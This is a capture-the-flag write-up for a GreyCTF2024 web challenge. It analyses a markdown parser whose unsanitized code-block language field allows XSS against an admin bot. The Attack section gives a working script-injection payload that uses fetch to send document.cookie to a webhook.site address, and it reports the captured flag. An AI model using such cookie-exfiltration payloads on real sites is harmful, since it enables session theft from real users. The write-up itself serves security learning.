# Challenge source
[Souce code](https://drive.google.com/file/d/1pdmUFvfpbyYt6umN0GCsrsLy7Zo137GP/view?usp=drive_link)
# Difficulty
Medium

# Author
ocean

# Approach
- The web challenge is a webapp that allows us to parse markdown document:

  ![image](https://github.com/NoSpaceAvailable/GreyCTF2024/assets/143888307/af1c9d1b-9e4d-4575-9f31-0bb7d906c525)

  ![image](https://github.com/NoSpaceAvailable/GreyCTF2024/assets/143888307/3e977db7-1d77-43ce-a2c3-009082fa5ac0)

- Looking at the source code, I see *admin.js* using puppeteer to create an admin bot to receive our markdown. So this challenge requires XSS:
  
  ```javascript
  const puppeteer = require('puppeteer')

  const visitUrl = async (url, cookieDomain) => {
      let browser =
          await puppeteer.launch({
              headless: true,
              pipe: true,
              dumpio: true,
              ignoreHTTPSErrors: true,
              args: [
                  '--incognito',
                  '--no-sandbox',
                  '--disable-gpu',
                  '--disable-software-rasterizer',
                  '--disable-dev-shm-usage',
              ]
          })
  
      try {
          const ctx = await browser.createIncognitoBrowserContext()
          const page = await ctx.newPage()
  
          try {
              await page.setCookie({
                  name: 'flag',
                  value: process.env.FLAG || 'flag{fake_flag}',
                  domain: cookieDomain,
                  httpOnly: false,
                  samesite: 'strict'
              })
              await page.goto(url, { timeout: 6000, waitUntil: 'networkidle2' })
          } finally {
              await page.close()
              await ctx.close()
          }
      }
      finally {
          browser.close()
      }
  }
  
  module.exports = { visitUrl };
  ```

- Looking at *index.js*, we have some points to notice about:

  1. The markdown we submit via POST request will be base64 encoded:

  ```html
  <script>
            document.getElementById('markdownForm').addEventListener('submit', function (event) {
                event.preventDefault();
                const input = document.getElementById('markdownInput').value;
                const encodedInput = btoa(input);
                window.location.href = '/parse-markdown?markdown=' + encodeURIComponent(encodedInput);
            });
  </script>
  ```

  3. At endpoint */parse-markdown*, the markdown will be base64 decoded and parsed by function *parseMarkdown*:

  ```javascript
  app.get('/parse-markdown', (req, res) => {
    const base64Markdown = req.query.markdown;
    if (!base64Markdown) {
        return res.status(400).send('No markdown content provided');
    }

    try {
        const markdown = atob(base64Markdown);
        console.log(markdown)
        const html = parseMarkdown(markdown);
        console.log(html)
        res.render('view', { content: html });
    } catch (error) {
        console.error(error);
        res.status(500).send('Error parsing markdown');
    }
  });
  ```

  4. At */feedback* endpoint, we send to the admin bot the URL that link to endpoint */parse-markdown* (with our markdown notation):

  ```javascript
  app.get('/feedback', async (req, res) => {
    const url = req.query.url
    console.log('received url: ', url)

    let parsedURL
    try {
        parsedURL = new URL(url)
    }
    catch (e) {
        res.send(escape(e.message))
        return
    }

    if (parsedURL.protocol !== 'http:' && parsedURL.protocol != 'https:') {
        res.send('Please provide a URL with the http or https protocol.')
        return
    }

    if (parsedURL.hostname !== req.hostname) {
        res.send(`Please provide a URL with a hostname of: ${escape(req.hostname)}, your parsed hostname was: escape(${parsedURL.hostname})`)
        return
    }

    try {
        console.log('visiting url: ', url)
        await visitUrl(url, req.hostname)
        res.send('The admin has viewed your feedback!')
    } catch (e) {
        console.log('error visiting: ', url, ', ', e.message)
        res.send('Error, admin unable to view your feedback')
    } finally {
        console.log('done visiting url: ', url)
    }

  })
  ```

- Looking at *markdown.js*, look like it just a normal text parsing function, except a point that it has a character sanitization function. They use this to sanitize my markdown to prevent XSS attack:

```javascript
function escapeHtml(text) {
    return text
        .replace(/&/g, '&amp;')
        .replace(/</g, '&lt;')
        .replace(/>/g, '&gt;')
        .replace(/"/g, '&quot;')
        .replace(/'/g, '&#039;');
}
```

- When I take a closer look at *parseMarkdown()*, I see that the *language** variable is not sanitized. If you don't know, most of platforms that support users to write markdowns also support syntax highlighting at md notation, by allow people to specifiy the language used.

```javascript
if (line.startsWith('```')) {
  language = line.substring(3).trim();
  inCodeBlock = true;
  htmlOutput += '<pre><code class="language-' + language + '">';
}
```

  ![image](https://github.com/NoSpaceAvailable/GreyCTF2024/assets/143888307/d41a96a5-57b3-438d-b659-341d3d9ad44f)

  ![image](https://github.com/NoSpaceAvailable/GreyCTF2024/assets/143888307/05051323-8c68-4884-9d19-4f66df739c58)

- Since we can control the languague, XSS is possible.

# Attack
- First, I have to make a POC. This is my payload:
  ```
  ```"><script>fetch("https://webhook.site/your-id-here/?cookie="+document.cookie)</script><"
  \``` (please remove '\')
  ```

  ![image](https://github.com/NoSpaceAvailable/GreyCTF2024/assets/143888307/006ca291-d6de-42d3-b140-5a4184f1bf4e)

- Submit and go to webhook. The request has been captured:

  ![image](https://github.com/NoSpaceAvailable/GreyCTF2024/assets/143888307/966d9d0a-3331-42c5-aaa9-544494ea2792)

- Send it to the bot and get the flag.

- Flag: grey{m4rkd0wn_th1s_fl4g}
